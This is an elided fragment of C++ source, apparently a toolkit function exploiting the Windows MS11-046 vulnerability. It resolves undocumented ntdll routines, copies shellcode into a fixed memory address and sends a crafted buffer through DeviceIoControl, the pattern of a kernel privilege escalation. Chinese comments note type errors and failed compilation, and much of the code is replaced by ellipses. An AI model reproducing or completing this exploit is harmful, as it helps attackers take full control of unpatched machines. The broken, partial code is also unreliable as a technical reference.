...
INT CToolKit::exp_ms_11046(VOID)
{
	...
	// ident  ify target machine's OS version
	...
	*/
	...
	//这里类型不对编不过
	typedef VOID(*mFUNC)(int, PVOID, int, ULONG *);
	
	mFUNC ZwQuerySystemInformation;
	
	ZwQuerySystemInformation = (mFUNC)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "ZwQuerySystemInformation");
	...
	//到处类型不匹配
	for (i = 0; i < (int)*systemInformationBuffer; i++)
	{
	...
	NtQueryIntervalProfile = (PNTQUERYINTERVAL)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQueryIntervalProfile");
	...
	ZwDeviceIoControlFile = GetProcAddress(GetModuleHandle(L"ntdll.dll"), "ZwDeviceIoControlFile");
	...
	//这里类型不对来回转
	memcpy((void *)((int)shellcodeAddress + 0x10000), shellcode, sizeof(shellcode));
	...
	if (DeviceIoControl(
		...
		(PVOID)lpInBuffer, lpInBufferSize * sizeof(DWORD),							//这里原来是sizeof(lpInBuffer)
		//上面这句相当奇淫 
